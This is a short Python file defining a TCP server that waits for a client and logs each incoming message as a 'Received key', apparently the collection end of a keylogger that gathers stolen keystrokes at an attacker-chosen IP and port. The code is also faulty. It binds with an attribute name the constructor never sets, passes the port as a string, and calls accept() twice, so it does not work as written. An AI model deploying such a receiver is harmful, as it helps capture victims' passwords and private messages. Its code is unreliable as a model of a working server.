import logging
import socket

class Server:
    def __init__(self, port, ip):
        self._port = port
        self.ip = ip
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def initialize(self):
        try:
            self._socket.bind((self.ip, self.port))
            self._socket.listen()
            logging.debug("Server was successfully initialized.")
        except socket.error:
            logging.error("Server was not initialized due to an error.")

    def collect_data(self):
            client_socket, client_address = self._socket.accept()
            while True:
                data = client_socket.recv(1024)  # Adjust the buffer size as needed
                if not data:
                    break
                    
                try:
                    key_data = data.decode("utf-8")
                    logging.info(f"Received key: {key_data}")
                except Exception as e:
                    logging.error(f"Error decoding received data: {str(e)}")

if __name__=="__main__":
    logging.basicConfig(level=logging.DEBUG)
# Initialize the server with the desired port
    server = Server("Your Port", "Your IP Address") #Enter Port and IP Address
    server.initialize()

    # Start collecting data
    logging.debug("Waiting for a client to connect...")
    client_socket, client_address = server._socket.accept()
    logging.debug(f"Client connected from {client_address}")
    while True:
        server.collect_data()